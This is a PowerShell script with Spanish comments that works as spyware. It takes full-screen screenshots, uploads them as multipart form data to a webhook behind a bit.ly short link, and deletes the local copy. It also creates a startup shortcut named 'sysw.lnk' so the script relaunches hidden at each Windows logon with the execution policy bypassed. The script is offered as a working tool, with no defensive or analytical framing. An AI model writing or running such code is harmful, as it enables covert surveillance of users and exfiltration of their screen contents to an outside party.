# Definir el Webhook URL y el intervalo de tiempo
$hookurl = "https://bit.ly/web_chupakbras"
$seconds = 45 # Intervalo de captura de pantalla en segundos
$a = 1 # Cantidad de capturas de pantalla

# Función para enviar la imagen al webhook
function Send-Screenshot {
    param (
        [string]$ImageFile,
        [string]$WebhookURL
    )
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file1`"; filename=`"screenshot.png`"",
        "Content-Type: image/png$LF",
        (Get-Content -Path $ImageFile -Encoding Byte),
        "--$boundary--$LF"
    )
    $body = $bodyLines -join $LF
    $contentType = "multipart/form-data; boundary=$boundary"
    Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType $contentType -Body $body
}

# Función para tomar una captura de pantalla
function Take-Screenshot {
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    return $Filett
}

# Función para ejecutar el bucle de capturas de pantalla
function Start-ScreenshotLoop {
    while ($a -gt 0) {
        $Filett = Take-Screenshot
        Send-Screenshot -ImageFile $Filett -WebhookURL $hookurl
        Remove-Item -Path $Filett
        Start-Sleep -Seconds $seconds
        $a--
    }
}

# Ejecutar el bucle de capturas de pantalla al iniciar Windows
$shortcutPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
$shortcut.Save()

# Iniciar el bucle de capturas de pantalla
Start-ScreenshotLoop
